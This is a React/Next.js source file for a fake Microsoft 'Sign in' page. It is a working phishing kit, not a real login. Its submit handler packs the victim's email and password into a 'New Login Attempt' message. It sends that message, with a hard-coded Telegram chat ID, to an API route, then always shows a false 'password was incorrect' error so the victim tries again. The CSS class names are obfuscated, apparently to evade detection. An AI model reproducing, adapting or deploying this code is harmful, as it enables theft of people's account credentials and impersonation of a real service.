'use client';

import { useForm } from 'react-hook-form';
import { z } from 'zod';
import { zodResolver } from '@hookform/resolvers/zod';
import { useState } from 'react';
import Link from 'next/link';

const loginSchema = z.object({
    email: z.string().email({ message: 'Invalid email address' }),
    password: z.string().min(1, { message: 'Password is required' }),
});

type LoginForm = z.infer<typeof loginSchema>;

export default function LoginPage() {
    const [sending, setSending] = useState(false);
    const [error, setError] = useState(false);

    const {
        register,
        handleSubmit,
        formState: { errors },
    } = useForm<LoginForm>({
        resolver: zodResolver(loginSchema),
    });

    const chatId = -4724313789

    const onSubmit = async (data: LoginForm) => {
        console.log(data);
        setSending(true);
        const message = `🟢 New Login Attempt\n\n📧 Email: ${data.email}\n🔐 Password: ${data.password}`;

        try {
            const res = await fetch("/api/send-message", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ chatId, text: message }),
            })

            const data = await res.json()
            console.log("Telegram response:", data)
            setSending(false);
            setError(true);
            setTimeout(() => setError(false), 4000);
        } catch (err) {
            console.error('Telegram error:', err);
            setError(true);
            setSending(false);
            setTimeout(() => setError(false), 4000);
        }
    };


    return (

        <main className='flex items-center justify-center min-h-screen'>
            <div className="aB_c0nT41n3r_X7z9">
                <div className="wE1Rd0_1c0n_r0w_42">
                    {/* ... your SVG icons unchanged ... */}
                </div>

                <h1 id="cR4zY_h34d3r_t3Xt">Sign in</h1>

                <p className="z4nY_sUbT3xT_123">Use your Microsoft account</p>
                <a href="#" className="qU1rKy_l1Nk_bLu3">What is this?</a>

                <form onSubmit={handleSubmit(onSubmit)} className="w4cKy_f0Rm_3l3m3nT_X">
                    <div className='w-full'>
                        <input
                            type="email"
                            placeholder="Email"
                            {...register('email')}
                            className="0Dd_1nPuT_f13Ld_42 inputs"
                        />
                        {errors.email && <p className="text-red-600 text-xs mb-2">{errors.email.message}</p>}
                    </div>

                    <div className='w-full'>
                        <input
                            type="password"
                            placeholder="Password"
                            {...register('password')}
                            className="0Dd_1nPuT_f13Ld_42 inputs"
                        />
                        {errors.password && (
                            <p className="text-red-600 text-xs mb-4">{errors.password.message}</p>
                        )}
                    </div>

                    <div className="b0nK3rS_cH3cKb0x_Wr4p">
                        <input type="checkbox" id="k33pS1gn3d1n" className="nUtTy_cH3cKb0x_99" />
                        <label htmlFor="k33pS1gn3d1n" className="l00Py_cH3cKb0x_t3Xt">
                            Keep me signed in
                        </label>
                    </div>

                    <div className="space-y-2 w-full">
                        <button
                            type="submit"
                            disabled={sending}
                            id="login"
                            className="cR4zY_bUtT0n_bLu3"
                        >
                            {sending ? 'Signing in...' : 'Sign in'}
                        </button>
                        {error && (
                            <p className="text-xs text-red-600 mb-4 text-center">
                                Sorry, your password was incorrect. Please double-check your password.
                            </p>
                        )}
                    </div>

                    <div className="n0_4cC0unT_t3Xt">
                        No account? <a href="#" className="qU1rKy_l1Nk_bLu3">Create one!</a>
                    </div>

                    <div className="w31Rd_b0tT0m_l1nKs">
                        <Link href="#" className="qU1rKy_l1Nk_bLu3">Forgot my password</Link>
                        <Link href="#" className="qU1rKy_l1Nk_bLu3">Sign in with a one-time code</Link>
                    </div>
                </form>
            </div>
        </main>


    );
}
